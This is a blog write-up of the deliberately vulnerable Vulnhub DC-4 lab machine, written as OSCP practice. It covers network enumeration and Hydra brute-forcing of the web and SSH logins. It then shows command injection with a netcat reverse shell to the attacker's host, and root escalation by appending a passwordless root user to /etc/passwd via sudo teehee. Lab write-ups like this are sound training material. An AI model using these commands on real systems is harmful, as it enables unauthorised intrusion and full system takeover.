---
title: Write-up DC4 on Vulnhub
author: eMVee
date: 2023-03-28 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, Command Injection, sudo]
render_with_liquid: false
---

Another vulnerable DC machine not on TJnull's list for OSCP. Still, I'm going to hack this one because it's good to practice for the OSCP exam and because the DC series on Vulnhub is very good to gain experience.The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-4,313/).

## Getting started
First create a working directory for this Vulnhub machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-4
```
Now I would like to know my own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15

```
Since I know my IP address it is time to identify other IP addresses in my virtual network. The first command I use is with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.33
```
Another method to identify IP addresses on my network is with arp-scan. I normally use arp-scan as second method since the results could be different.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.33       08:00:27:d9:e6:41       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 4 responded
```
There is a new IP address in my virtual network. Now let's create a variable called `ip` which has the IP address of the target assigned.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ ip=10.0.2.33
```

## Enumeration
Next we should discover what ports are open on the target.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ nmap -sC -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 13:10 CEST
Nmap scan report for 10.0.2.33
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 8d6057066c27e02f762ce642c001ba25 (RSA)
|   256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)
|_  256 fd39478a5e58339973739e227f904f4b (ED25519)
80/tcp open  http
|_http-title: System Tools

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds

```
Nmap discovered two open ports, so let's add them to our notes:
* Port 22
	* SSH
* Port 80
	* HTTP
	* Title: System tools

Enumerate first port 80 with whatweb to identify the technologies used on this webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ whatweb http://$ip
http://10.0.2.33 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.15.10], IP[10.0.2.33], PasswordField[password], Title[System Tools], nginx[1.15.10]

```
Some interesting information are found with whatweb.
* nginx 1.15.10
* A password field?

Now let's run nikto against out target. Perhaps nikto will find some vulnerabilities or interesting information.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ nikto -h http://$ip 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.33
+ Target Hostname:    10.0.2.33
+ Target Port:        80
+ Start Time:         2023-03-27 13:11:25 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.15.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Cookie PHPSESSID created without the httponly flag
+ 7915 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-03-27 13:11:54 (GMT2) (29 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

No useful information is identified right now. So let's enumerate some more and visit the website in the webbrowser.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327131537.png){: width="700" height="400" }


I've tried the default combination `admin:admin`, but this did not work. The basis SQL injection bypass didn't work either. So let's enumerate some more information. 

First let's run dirb to enumerate some directories on the webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ dirb http://$ip     

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar 27 13:17:20 2023
URL_BASE: http://10.0.2.33/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.33/ ----
==> DIRECTORY: http://10.0.2.33/css/                                                                               
==> DIRECTORY: http://10.0.2.33/images/                                                                            
+ http://10.0.2.33/index.php (CODE:200|SIZE:506)  

---- Entering directory: http://10.0.2.33/css/ ----
---- Entering directory: http://10.0.2.33/images/ ----

-----------------
END_TIME: Mon Mar 27 13:17:24 2023
DOWNLOADED: 13836 - FOUND: 1

```

Some directories were found, but not really interesting. Let's check with dirsearch if there are interesting files available.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ dirsearch -u http://$ip -e php,txt,html 

  _|. _ _  _  _  _ _|_    v0.4.2                                                        
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 9901

Output File: /home/emvee/.dirsearch/reports/10.0.2.33/_23-03-27_13-17-31.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-03-27_13-17-31.log

Target: http://10.0.2.33/

[13:17:31] Starting: 
[13:17:44] 302 -  704B  - /command.php  ->  index.php                       
[13:17:45] 301 -  170B  - /css  ->  http://10.0.2.33/css/                   
[13:17:50] 403 -  556B  - /images/                                          
[13:17:50] 301 -  170B  - /images  ->  http://10.0.2.33/images/             
[13:17:51] 200 -  506B  - /index.php                                        
[13:17:51] 403 -   15B  - /index.pHp                                        
[13:17:53] 302 -  206B  - /login.php  ->  index.php                         
[13:17:54] 302 -  163B  - /logout.php  ->  index.php                        
                                                                             
Task Completed 
```
It looks like there is a file called `command.php` present. The file redirects only to `index.php`. So we need to logon to this webapplication.

Let's try to brute force for the user `admin` a password with Hydra/

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ 
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form '/login.php:username=^USER^&password=^PASS^:S=command' 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-27 13:24:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.0.2.33:80/login.php:username=^USER^&password=^PASS^:S=command
[80][http-post-form] host: 10.0.2.33   login: admin   password: happy
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-27 13:24:25
``` 

Now logon the the System Tools with the credentials `admin:happy`.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327132800.png){: width="700" height="400" }


Click on the `Command` link to open the command.php file.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327132845.png){: width="700" height="400" }

It looks like we can run some commands if we choose one of the radio buttons and click on the `Run` button. To adjust the request we need to intercept the request with a proxy. To do so we have to intercept the request with Burp Suite and identify if we can run our own commands.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327133631.png){: width="700" height="400" }

It looks like there is a command `ls -l` send to the server.
Now let's change this command to `whoami` to see if this might work for us.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327133738.png){: width="700" height="400" }

And then forward the request to the target.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327133815.png){: width="700" height="400" }

It looks like our command executed by the server. So now we can try to get a reverse shell. Since the request is captured by Burp Suite, we can send it to the Burp Suite Repeater and craft our reverse shell.

First let's start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ sudo nc -lvp 53           
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53

```

Send the request to the Repeater.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327134101.png){: width="700" height="400" }


Then craft the reverse shell command in Repeater `nc 10.0.2.15 53 -e /bin/bash` and hit the Send button.
![Image](/assets/img/WriteUp/Vulnhub/DC4/Pasted image 20230327134925.png){: width="700" height="400" }

## Initial access
Now we have to check the netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ sudo nc -lvp 53
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.0.2.33.
Ncat: Connection from 10.0.2.33:35814.

```
A connection has been established! 
```bash
whoami
www-data
```
So we are www-data, now let's upgrade the shell a bit.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dc-4:/usr/share/nginx/html$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
```

```bash
www-data@dc-4:/usr/share/nginx/html$ export TERM=xterm-256color  
export TERM=xterm-256color  
www-data@dc-4:/usr/share/nginx/html$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'
```

```bash
www-data@dc-4:/usr/share/nginx/html$ ^Z
zsh: suspended  sudo nc -lvp 53
```

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  sudo nc -lvp 53
```
Hit the enter key on the keyboard.
```bash
www-data@dc-4:/usr/share/nginx/html$ stty columns 200 rows 200
stty columns 200 rows 200
www-data@dc-4:/usr/share/nginx/html$ 
```

Ready to rumble and gather more information!

```bash
www-data@dc-4:/usr/share/nginx/html$ uname -a
uname -a
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux
www-data@dc-4:/usr/share/nginx/html$ uname -mrs
uname -mrs
Linux 4.9.0-3-686 i686
www-data@dc-4:/usr/share/nginx/html$ cat /proc/version
cat /proc/version
Linux version 4.9.0-3-686 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19)
www-data@dc-4:/usr/share/nginx/html$ cat /etc/issue
cat /etc/issue
Debian GNU/Linux 9 \n \l

www-data@dc-4:/usr/share/nginx/html$ cat /etc/*-release
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
www-data@dc-4:/usr/share/nginx/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.8 (stretch)
Release:        9.8
Codename:       stretch
www-data@dc-4:/usr/share/nginx/html$ 

```

Now let's enumerate some users on the system.
```bash
www-data@dc-4:/usr/share/nginx/html$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
charles
jim
sam
www-data@dc-4:/usr/share/nginx/html$ 

```

Let's enumerate the home directories of the users. Perhaps a interesting file is stored in one of the home directories.
```bash
www-data@dc-4:/usr/share/nginx/html$ ls /home -ahlR
ls /home -ahlR
/home:
total 20K
drwxr-xr-x  5 root    root    4.0K Apr  7  2019 .
drwxr-xr-x 21 root    root    4.0K Apr  5  2019 ..
drwxr-xr-x  2 charles charles 4.0K Apr  7  2019 charles
drwxr-xr-x  3 jim     jim     4.0K Apr  7  2019 jim
drwxr-xr-x  2 sam     sam     4.0K Apr  7  2019 sam

/home/charles:
total 20K
drwxr-xr-x 2 charles charles 4.0K Apr  7  2019 .
drwxr-xr-x 5 root    root    4.0K Apr  7  2019 ..
-rw-r--r-- 1 charles charles  220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 charles charles 3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 charles charles  675 Apr  6  2019 .profile

/home/jim:
total 32K
drwxr-xr-x 3 jim  jim  4.0K Apr  7  2019 .
drwxr-xr-x 5 root root 4.0K Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4.0K Apr  7  2019 backups
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh

/home/jim/backups:
total 12K
drwxr-xr-x 2 jim jim 4.0K Apr  7  2019 .
drwxr-xr-x 3 jim jim 4.0K Apr  7  2019 ..
-rw-r--r-- 1 jim jim 2.0K Apr  7  2019 old-passwords.bak

/home/sam:
total 20K
drwxr-xr-x 2 sam  sam  4.0K Apr  7  2019 .
drwxr-xr-x 5 root root 4.0K Apr  7  2019 ..
-rw-r--r-- 1 sam  sam   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 sam  sam  3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 sam  sam   675 Apr  6  2019 .profile
www-data@dc-4:/usr/share/nginx/html$ 
```

It looks like there are two interesting files in the hime directory of Jim.
* test.sh
	* This file has permissions set to everyone. So we can read, write and execute it.
* old-passwords.bak
	* This file is readable for everyone.

Let's check those files.

```bash
www-data@dc-4:/usr/share/nginx/html$ cat /home/jim/test.sh 
cat /home/jim/test.sh
#!/bin/bash
for i in {1..5}
do
 sleep 1
 echo "Learn bash they said."
 sleep 1
 echo "Bash is good they said."
done
 echo "But I'd rather bash my head against a brick wall."
```

```bash
www-data@dc-4:/usr/share/nginx/html$ cat /home/jim/backups/old-passwords.bak
cat /home/jim/backups/old-passwords.bak
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
loveme1
juventus
jennifer1
!~!1
bubbles
samuel
fuckoff
lovers
cheese1
0123456
123asd
999999999
madison
elizabeth1
music
buster1
lauren
david1
tigger1
123qweasd
taylor1
carlos
tinkerbell
samantha1
Sojdlg123aljg
joshua1
poop
stella
myspace123
asdasd5
freedom1
whatever1
xxxxxx
00000
valentina
a1b2c3
741852963
austin
monica
qaz123
lovely1
music1
harley1
family1
spongebob1
steven
nirvana
1234abcd
hellokitty
thomas1
cooper
520520
muffin
christian1
love13
fucku2
arsenal1
lucky7
diablo
apples
george1
babyboy1
crystal
1122334455
player1
aa123456
vfhbyf
forever1
Password
winston
chivas1
sexy
hockey1
1a2b3c4d
pussy
playboy1
stalker
cherry
tweety
toyota
creative
gemini
pretty1
maverick
brittany1
nathan1
letmein1
cameron1
secret1
google1
heaven
martina
murphy
spongebob
uQA9Ebw445
fernando
pretty
startfinding
softball
dolphin1
fuckme
test123
qwerty1234
kobe24
alejandro
adrian
september
aaaaaa1
bubba1
isabella
abc123456
password3
jason1
abcdefg123
loveyou1
shannon
100200
manuel
leonardo
molly1
flowers
123456z
007007
password.
321321
miguel
samsung1
sergey
sweet1
abc1234
windows
qwert123
vfrcbv
poohbear
d123456
school1
badboy
951753
123456c
111
steven1
snoopy1
garfield
YAgjecc826
compaq
candy1
sarah1
qwerty123456
123456l
eminem1
141414
789789
maria
steelers
iloveme1
morgan1
winner
boomer
lolita
nastya
alexis1
carmen
angelo
nicholas1
portugal
precious
jackass1
jonathan1
yfnfif
bitch
tiffany
rabbit
rainbow1
angel123
popcorn
barbara
brandy
starwars1
barney
natalia
jibril04
hiphop
tiffany1
shorty
poohbear1
simone
albert
marlboro
hardcore
cowboys
sydney
alex
scorpio
1234512345
q12345
qq123456
onelove
bond007
abcdefg1
eagles
crystal1
azertyuiop
winter
sexy12
angelina
james
svetlana
fatima
123456k
icecream
popcorn1
www-data@dc-4:/usr/share/nginx/html$  
```
Copy the content of the old passwords and let's create the old password list on our attacker machine. Next we have to create a user list before trying them to brute force with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ nano old-passwords.bak

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ nano users.txt        
```
Now let's brute force the SSH service with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ hydra -L users.txt -P old-passwords.bak $ip ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-27 14:05:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 756 login tries (l:3/p:252), ~48 tries per task
[DATA] attacking ssh://10.0.2.33:22/
[STATUS] 136.00 tries/min, 136 tries in 00:01h, 624 to do in 00:05h, 12 active
[STATUS] 100.00 tries/min, 300 tries in 00:03h, 460 to do in 00:05h, 12 active
[STATUS] 93.71 tries/min, 656 tries in 00:07h, 104 to do in 00:02h, 12 active
[22][ssh] host: 10.0.2.33   login: jim   password: jibril04
[STATUS] 94.62 tries/min, 757 tries in 00:08h, 3 to do in 00:01h, 12 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-27 14:14:02

```

It looks like we have credentials for jim now.
The password should been add to our notes now:
```
jibril04
```

## Privilege escalation

Now let's logon via SSH as Jim.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-4]
└─$ ssh jim@$ip        
The authenticity of host '10.0.2.33 (10.0.2.33)' can't be established.
ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.33' (ED25519) to the list of known hosts.
jim@10.0.2.33's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$ 
```

Since we have a password of the user Jim, let's check if we can sudo anything.
```bash
jim@dc-4:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jim: 
Sorry, user jim may not run sudo on dc-4.
```
It is not possible to sudo. Now let's check the user.
```bash
jim@dc-4:~$ whoami;id;hostname
jim
uid=1002(jim) gid=1002(jim) groups=1002(jim)
dc-4
```
Nothing interesting for now. In the welcome message something was mentioned about a new email. Now let's check the mailbox.
```bash
jim@dc-4:~$ cat mbox
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.

jim@dc-4:~$ 

```
It looks like it is an email from the root. let's check in the `/var/mail` directory for more emails.
```bash
jim@dc-4:~$ ls /var/mail
jim
jim@dc-4:~$ cat /var/mail/jim 
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles

jim@dc-4:~$ 

```

Jim got an email from Charles. This might be a password what we can use. So let's add them to our notes.
```
^xHhA&hvim0y
```

Now let's switch user to Charles.
```bash
jim@dc-4:~$ su charles
Password: 
charles@dc-4:/home/jim$
```
Let's try first to check if the user has sudo permissions. We got a password if the system asks for a password.
```bash
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
charles@dc-4:~$ 

```
It looks like we may run teehee as sudo. I've no idea how to use this in our advantage yet. But let's check GTFObins.

I could not find teehee, but I saw [tee on GTFObins](https://gtfobins.github.io/gtfobins/tee/).

Let's check what teehee help tells us.
```bash
charles@dc-4:~$ teehee --help
Usage: teehee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit

MODE determines behavior with write errors on the outputs:
  'warn'         diagnose errors writing to any output
  'warn-nopipe'  diagnose errors writing to any output not a pipe
  'exit'         exit on error writing to any output
  'exit-nopipe'  exit on error writing to any output not a pipe
The default MODE for the -p option is 'warn-nopipe'.
The default operation when --output-error is not specified, is to
exit immediately on error writing to a pipe, and diagnose errors
writing to non pipe outputs.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/tee>
or available locally via: info '(coreutils) tee invocation'

```
It looks like we can append files.. This makes it possible to add a root user to `/etc/passwd`.
The command should look like this:
```bash
echo "emvee::0:0:::/bin/sh" | sudo /usr/bin/teehee -a /etc/passwd
```
Now let's run the command
```bash
charles@dc-4:~$ echo "emvee::0:0:::/bin/sh" | sudo /usr/bin/teehee -a /etc/passwd
emvee::0:0:::/bin/sh

```
Now we only have to switch user to the new root user called `emvee`.
```bash
charles@dc-4:~$ su emvee
# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
dc-4
# cd /root
# ls
flag.txt
# whoami;id;hostname;ifconfig;cat flag.txt
root
uid=0(root) gid=0(root) groups=0(root)
dc-4
sh: 4: ifconfig: not found



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
# 

```
